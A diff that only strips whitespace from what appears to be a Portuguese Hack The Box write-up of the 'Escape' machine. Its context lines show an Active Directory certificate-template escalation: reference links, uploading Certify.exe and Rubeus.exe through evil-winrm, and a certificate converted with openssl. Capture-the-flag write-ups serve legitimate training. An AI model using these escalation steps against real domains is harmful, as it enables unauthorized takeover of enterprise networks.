@@ -321,8 +321,6 @@ Info: Establishing connection to remote endpoint
 1. https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#active-directory-certificate-services
 
 2. [From Misconfigured Certificate Template to Domain Admin - Red Team Notes](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin)
-   
-   
 
     De início, devemos fazer upload do script "Certify.exe" para a máquina usando o comando de upload do evil-winrm.
 
@@ -452,7 +450,7 @@ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provid
 *Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> upload /home/kali/Desktop/HTB/machines/to-do/escape/cert.pfx C:\Users\Ryan.Cooper\Desktop\cert.pfx
 Info: Uploading /home/kali/Desktop/HTB/machines/to-do/escape/cert.pfx to C:\Users\Ryan.Cooper\Desktop\cert.pfx
 
-                                                             
+
 Data: 4564 bytes of 4564 bytes copied
 
 Info: Upload successful!
@@ -460,7 +458,7 @@ Info: Upload successful!
 *Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> upload /opt/Privesc_scripts/Windows_Privesc/ghostpack/Rubeus.exe C:\Users\Ryan.Cooper\Desktop\Rubeus.exe
 Info: Uploading /opt/Privesc_scripts/Windows_Privesc/ghostpack/Rubeus.exe to C:\Users\Ryan.Cooper\Desktop\Rubeus.exe
 
-                                                             
+
 Data: 595968 bytes of 595968 bytes copied
 
 Info: Upload successful!
